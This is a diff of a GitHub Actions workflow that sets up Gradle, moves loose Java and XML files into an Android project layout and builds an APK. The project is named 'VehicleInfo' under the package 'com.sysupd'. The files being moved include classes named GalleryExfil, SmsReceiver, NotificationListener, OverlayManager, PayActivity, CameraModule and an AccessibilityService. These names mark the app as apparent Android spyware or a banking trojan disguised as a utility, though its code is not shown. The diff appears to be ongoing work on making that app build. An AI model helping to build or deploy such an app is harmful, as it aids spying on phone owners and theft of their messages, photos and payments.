@@ -17,36 +17,29 @@ jobs:
           distribution: temurin
           java-version: '17'
 
-      - name: Setup Gradle 8.5
+      - name: Download Gradle 8.7
         run: |
           cd /tmp
-          wget -q https://services.gradle.org/distributions/gradle-8.5-bin.zip
-          unzip -q gradle-8.5-bin.zip
-          echo "/tmp/gradle-8.5/bin" >> $GITHUB_PATH
-          /tmp/gradle-8.5/bin/gradle --version
+          wget -q https://services.gradle.org/distributions/gradle-8.7-bin.zip
+          unzip -q gradle-8.7-bin.zip
+          echo "/tmp/gradle-8.7/bin" >> $GITHUB_PATH
+          /tmp/gradle-8.7/bin/gradle --version
 
-      - name: Debug and Rearrange
+      - name: Rearrange files
         run: |
           set -e
-          echo "=== ROOT FILES ==="
-          ls -la
-
-          # Create folders
           mkdir -p app/src/main/java/com/sysupd
           mkdir -p app/src/main/res/layout
           mkdir -p app/src/main/res/values
           mkdir -p app/src/main/res/xml
           mkdir -p app/src/main/res/mipmap-hdpi
-          mkdir -p gradle/wrapper
 
-          # Move Java files
           for f in AccessibilityService BootReceiver CameraModule Cmd Core \
                    ForegroundService GalleryExfil MainActivity NotificationListener \
                    OverlayManager PayActivity ProjectionActivity SmsReceiver SuccessActivity; do
             if [ -f "$f.java" ]; then mv "$f.java" app/src/main/java/com/sysupd/; fi
           done
 
-          # Move XML resources
           [ -f activity_main.xml ] && mv activity_main.xml app/src/main/res/layout/
           [ -f activity_success.xml ] && mv activity_success.xml app/src/main/res/layout/
           [ -f colors.xml ] && mv colors.xml app/src/main/res/values/
@@ -56,9 +49,9 @@ jobs:
           [ -f ic_launcher.png ] && mv ic_launcher.png app/src/main/res/mipmap-hdpi/
           [ -f AndroidManifest.xml ] && mv AndroidManifest.xml app/src/main/
           [ -f google-services.json ] && mv google-services.json app/
+          rm -f build.gradle
 
-          # Root build.gradle with AGP 8.5
-          cat > build.gradle << 'EOFROOT'
+          cat > build.gradle << 'EOF'
           buildscript {
               repositories { google(); mavenCentral() }
               dependencies {
@@ -69,15 +62,13 @@ jobs:
           allprojects {
               repositories { google(); mavenCentral() }
           }
-          EOFROOT
+          EOF
 
-          # app/build.gradle
-          cat > app/build.gradle << 'EOFAPP'
+          cat > app/build.gradle << 'EOF'
           plugins {
               id 'com.android.application'
               id 'com.google.gms.google-services'
           }
-
           android {
               namespace 'com.sysupd'
               compileSdk 34
@@ -93,30 +84,24 @@ jobs:
                   targetCompatibility JavaVersion.VERSION_17
               }
           }
-
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
               implementation 'com.google.android.material:material:1.11.0'
           }
-          EOFAPP
+          EOF
 
-          cat > settings.gradle << 'EOFSET'
+          cat > settings.gradle << 'EOF'
           rootProject.name = "VehicleInfo"
           include ':app'
-          EOFSET
+          EOF
 
-          cat > gradle.properties << 'EOFPROP'
+          cat > gradle.properties << 'EOF'
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m
-          EOFPROP
+          EOF
 
           echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
-
-          echo "=== FINAL STRUCTURE ==="
-          find app -type f | sort
-          echo "=== app/src/main/AndroidManifest.xml ==="
-          cat app/src/main/AndroidManifest.xml 2>/dev/null || echo "MISSING"
 
       - name: Build APK
         run: gradle assembleDebug --no-daemon --stacktrace
